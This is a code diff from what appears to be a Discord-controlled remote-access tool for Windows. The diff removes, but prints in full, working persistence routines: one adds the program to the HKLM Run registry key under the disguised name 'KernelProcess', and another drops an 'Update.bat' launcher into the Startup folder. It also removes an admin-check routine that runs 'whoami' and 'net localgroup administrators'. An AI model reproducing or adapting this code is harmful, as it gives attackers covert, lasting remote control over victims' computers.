@@ -114,54 +114,6 @@ async def on_message(msg):
                         
                     else:
                         await msg.channel.send("Failed to take screenshot.")
-                
-                elif str_msg == "persistence" or str_msg == "pt":            
-                    p = addPersistence()
-                    result = "Failed to add persistence."
-                    
-                    if p:
-                        result = "Successfully added persistence."
-                        
-                    await msg.channel.send(result)
-        
-def addPersistence():
-    s = addToRegistry()
-    
-    if not s:
-        s = addToStartup()
-        
-    return s
-
-def addToStartup():
-    try:
-        startup_is = False
-        temp = os.getenv("TEMP")
-        login = os.getlogin()
-        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
-        file_path = os.path.abspath(sys.argv[0])
-            
-        with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
-            bat_file.write(r'start "" "%s"' % file_path)
-        startup_is = True
-        return startup_is
-    except:
-        return False
-
-def addToRegistry():
-    try:
-        address = os.path.abspath(sys.argv[0])
-
-        key = reg.HKEY_LOCAL_MACHINE
-        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-
-        reg_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
-        reg.SetValueEx(reg_key, "KernelProcess", 0, reg.REG_SZ, address)
-        reg.CloseKey(reg_key)
-
-        return True
-
-    except:
-        return False
     
 def runCommand(command):
     try:
@@ -210,30 +162,6 @@ def getScreenshot(path=None):
         return True
         
     except:
-        return False
-
-def isAdmin():
-    user = ''
-    admins = ''
-    platform = 'powershell.exe '
-    admin_cmd = 'net localgroup administrators'
-    admin_cmd = admin_cmd.split()
-    
-    for line in runCommand('whoami'):
-        user += line.decode()
-    for line in runCommand(admin_cmd):
-        admins += line.decode()
-        
-    if '\\' in user:
-        user = user.split('\\')[1]
-
-    if 'Administrator' in admins:
-        admins = admins.split('Administrator')[2]
-
-    if user in admins:
-        return True
-        
-    else:
         return False
 
 def exit_handler():
